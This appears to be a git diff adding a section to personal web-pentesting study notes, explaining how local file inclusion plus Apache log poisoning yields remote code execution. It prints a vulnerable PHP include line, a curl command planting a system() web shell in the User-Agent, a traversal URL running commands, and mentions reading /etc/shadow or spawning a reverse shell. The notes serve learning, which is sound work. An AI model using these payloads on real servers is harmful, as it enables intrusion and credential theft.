@@ -103,6 +103,27 @@ Usage:
 
 📌 Wrappers are primarily dangerous in PHP
 
+---
+
+### The Setup
+A vulnerable PHP website has code like this: `<?php include($_GET['page']); ?>`
+And the URL looks like: `http://target.com/index.php?page=home.php`
+- Step 1 — Poison the log file
+- Every time someone visits the website, Apache logs the request in /var/log/apache2/access.log, including the User-Agent header (which is the browser name). You can control this header. So you send a request with PHP code as your User-Agent:
+`curl -A "<?php system($_GET['cmd']); ?>" http://target.com/`
+Now the Apache log file contains a line like:
+`10.10.14.8 - - [09/Mar/2026] "GET / HTTP/1.1" 200 ... "<?php system($_GET['cmd']); ?>"`
+The PHP code is now sitting inside the log file. That's the **poisoning** part.
+- Step 2 — Include the poisoned log
+Now you use LFI to make the server include that log file:
+`http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=whoami`
+Here's what happens internally: PHP runs `include('/var/log/apache2/access.log')`. It reads through the log file, hits the line containing `<?php system($_GET['cmd']); ?>`, recognizes it as PHP code, and executes it. Since `cmd=whoami`, it runs whoami on the server and returns the output to you.
+Why this is powerful
+You now have remote code execution. You can change `cmd=whoam` to `cmd=id`, `cmd=cat /etc/shadow`, or even use it to spawn a reverse shell. All because the server executed a file it included, rather than just reading it.
+That's the key — a normal path traversal would show you the raw log file text including the `<?php ... ?>` as plain text. But with LFI, the server treats it as code and runs it.
+
+---
+
 ## Insecure deserialization:
 ### What Is Serialization / Deserialization?
 - `Serialization` is the process of converting an object in memory (like a Java object, Python dict, or PHP class instance) into a format that can be stored or transmitted — such as a byte stream, JSON, XML, or a language-specific format.
